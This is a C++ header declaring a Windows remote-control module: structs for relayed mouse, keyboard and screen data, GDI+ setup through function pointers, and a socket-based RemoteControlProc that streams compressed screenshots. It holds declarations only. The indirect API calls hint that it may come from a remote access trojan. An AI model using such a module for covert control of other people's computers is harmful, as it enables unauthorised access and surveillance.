
#pragma once
#ifndef REMOTECONTROLPROC_H_H_H
#define REMOTECONTROLPROC_H_H_H
#include <Windows.h>
#include "../api.h"
#include "../public.h"
#include "AppScreenshot.h"
#include "ScreenSnapshot.h"
#include "../network/NetWorkdata.h"
#include "zconf.h"
#include "zlib.h"
#pragma comment(lib,"zlib.lib")
#pragma comment(lib, "GdiPlus.lib")
#pragma comment(lib, "GdiPlus.lib")


using namespace Gdiplus;
using namespace std;
class GdiPlusIniter
{
public:
	GdiPlusIniter()
	{
		GdiplusStartupInput StartupInput;
		lpGdiplusStartup(&m_gdiplusToken, &StartupInput, NULL);
	}

	~GdiPlusIniter()
	{
		lpGdiplusShutdown(m_gdiplusToken);
	}
private:
	ULONG_PTR m_gdiplusToken;
};
//need to initialize the Gdiplus object,else the function in screenshot will be in error

#pragma pack(1)


typedef struct {
	int delta;
	int xy;
}REMOTECONTROLWHEEL, * LPREMOTECONTROLWHEEL;


typedef struct {
	POINT pos;
	POINT size;
}REMOTECONTROLPOS, * LPREMOTECONTROLPOS;

typedef struct {
	unsigned char key;
	unsigned char shiftkey;
}REMOTECONTROLKEY, * LPREMOTECONTROLKEY;


typedef struct {
	int screenx;
	int screeny;
	int bitsperpix;
}STREMOTECONTROLPARAMS, * LPSTREMOTECONTROLPARAMS;

#pragma pack()

int checkTime(DWORD* dwSleepTimeValue);

int ScreenFrameChecker(char* src, char* dst, int len, int bytesperpix, int selector);
DWORD __stdcall RemoteControlProc(int bitsperpix, char* lpBuf, int BufLen, char* lpZlibBuf, int ZlibBufLen, SOCKET hSock, char* lpBackup);


#endif